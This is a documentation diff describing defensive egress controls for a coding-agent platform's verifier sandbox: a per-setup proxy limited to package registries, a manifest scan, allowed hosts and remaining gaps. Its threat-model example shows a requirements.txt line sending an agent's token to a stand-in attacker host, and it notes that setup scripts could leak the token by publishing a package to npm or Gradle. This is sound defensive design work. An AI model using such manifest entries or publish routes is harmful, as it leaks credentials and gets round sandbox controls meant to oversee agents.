@@ -500,7 +500,7 @@ Where coding drivers run, and how to run them safely. Design and threat model:
 | `claude_code`, `=none` | host, as the API user | **denied** unless `DRIVER_ALLOW_HOST_SHELL=true` | allowlist (`drivers/host_exec.py`) |
 | `opencode` (**parked**: `DRIVER_OPENCODE_ENABLED=false`, reports unavailable) | host, as the API user | **denied** unless `DRIVER_OPENCODE_ALLOW_BASH=true` | allowlist |
 | `local` | in the API process | `run_command`: `TOOL_SHELL_MODE=allowlist` (read-only programs) | `shell_allowlist.child_env()` |
-| verifiers | `VERIFIER_SANDBOX=docker`: `--network none` container. `=none`: code-executing checks are **inconclusive** unless `VERIFIER_ALLOW_HOST_EXECUTION=true` | — | — |
+| verifiers | `VERIFIER_SANDBOX=docker`: checks in a `--network none` container; dependency setup on an internal network, egress only via the proxy to package registries (see "Verifier setup egress"). `=none`: code-executing checks are **inconclusive** unless `VERIFIER_ALLOW_HOST_EXECUTION=true` | — | — |
 
 ### Enable the task runtime
 
@@ -540,6 +540,71 @@ The agent's shell can run the project's tests offline (Python projects):
 - Each run's metadata has `tool_env` (`mounted read-only`, `off`, `not mounted: …` or
   `unavailable: …`). To turn it off, set `LIFE_GRAPH_DRIVER_RUNTIME_PROJECT_TOOLS=false`.
 - Node and JVM projects are not covered yet.
+
+### Verifier setup egress
+
+The verifier sandbox's setup phase (`sandbox.prepare_env` / `prepare_node_env` /
+`prepare_gradle_env`) installs dependencies from manifests the agent may have edited. Without a
+fence, `x @ https://evil.example/?t=<token>` in `requirements.txt` sends the agent's token out
+around the task runtime's allowlist. Two controls (`services/dev/setup_guard.py`):
+
+1. **Egress proxy (enforcing).** Each setup gets its own `--internal` network with an isolated
+   gateway (checked) and its own `life-graph-sandbox-egress` proxy, which relays only to the
+   toolchain's registries on 443. DNS for outside names does not resolve, and direct
+   connections have no route. The setup container has `HTTPS_PROXY` set (plus npm's
+   `npm_config_*proxy` and Java's `-Dhttps.proxyHost` for Gradle). Network, proxy and
+   container are removed after each setup. The startup and periodic sweep remove leftovers
+   labelled `life-graph.runtime.task=verifier-setup` once they are older than the setup
+   timeout plus 5 minutes.
+2. **Manifest scan (fail fast).** Before the cache lookup, setup is refused if any of these
+   names something other than a package from the registries: `requirements*.txt`,
+   `constraints*.txt`, `requirements/*.txt` (and their `-r`/`-c` includes),
+   `pyproject.toml` (and workspace members), `uv.toml`, `uv.lock`, `package.json`,
+   `package-lock.json`, `npm-shrinkwrap.json`, the Gradle build files and
+   `gradle-wrapper.properties`. Refused are direct URL, VCS, index or find-links overrides,
+   `--trusted-host`/`allow-insecure-host`, lockfile entries resolved from another host, and
+   local paths outside the worktree. Symlinked or unparseable manifests are refused too. A
+   refusal makes the verifier **inconclusive** (never passed). The message names the file and
+   host, never the query string.
+
+Hosts, by setting (comma-separated):
+
+```bash
+LIFE_GRAPH_VERIFIER_SETUP_EGRESS_PYTHON=pypi.org,files.pythonhosted.org
+LIFE_GRAPH_VERIFIER_SETUP_EGRESS_NODE=registry.npmjs.org
+LIFE_GRAPH_VERIFIER_SETUP_EGRESS_JVM=services.gradle.org,downloads.gradle.org,downloads.gradle-dn.com,plugins.gradle.org,plugins-artifacts.gradle.org,repo.maven.apache.org,repo1.maven.org,dl.google.com,maven.google.com
+```
+
+A project that really needs another host (a private index, a git dependency, a postinstall
+that downloads a binary) lists it in its registry setting `sandbox_setup_allow`: a list of
+hostnames, plus `path` to allow local paths outside the worktree. Those hosts are then allowed
+in the manifests **and** added to that project's setup proxy. An entry that is not a plain
+hostname refuses setup. This is operator configuration, like `sandbox_setup`. The worktree
+cannot change it.
+
+```bash
+curl -X PATCH .../kernel/projects/<id> -d '{"sandbox_setup_allow": ["pkgs.corp.example"]}'
+```
+
+Requirements: the egress image (`life-graph-sandbox-egress:dev`, or
+`LIFE_GRAPH_DRIVER_RUNTIME_EGRESS_IMAGE`) and docker >= 28 are now needed whenever
+`VERIFIER_SANDBOX=docker`. Without them, setup is unavailable and the checks that need it are
+inconclusive. There is no fallback to an open network or to the host. Cached environments are
+keyed as before. The scan runs before every cache lookup, so a cached env is never handed out
+for manifests that are now refused.
+
+What it does not close:
+
+- **Registries that accept writes on the same hostname.** `registry.npmjs.org` takes
+  `npm publish` and `plugins.gradle.org` takes plugin publishes. Code that runs during setup (an
+  npm lifecycle script, a Gradle build script, a dependency's own install script) could publish
+  a package that carries the token, using an account the attacker controls. PyPI uploads go to
+  `upload.pypi.org`, which is not allowed. Closing this needs a read-only mirror or a
+  pull-through cache (the proxy does not terminate TLS, so it cannot filter by method).
+- **The scan is a fast first check, not a parser for every format.** For example, a host-run
+  agent (OpenCode's `run_tests`) could rewrite a manifest between the scan and setup. The proxy
+  is what holds then.
+- The JVM path is covered by unit tests only. No JVM image was on the evidence machine.
 
 ### Claude login for sandboxed runs
 
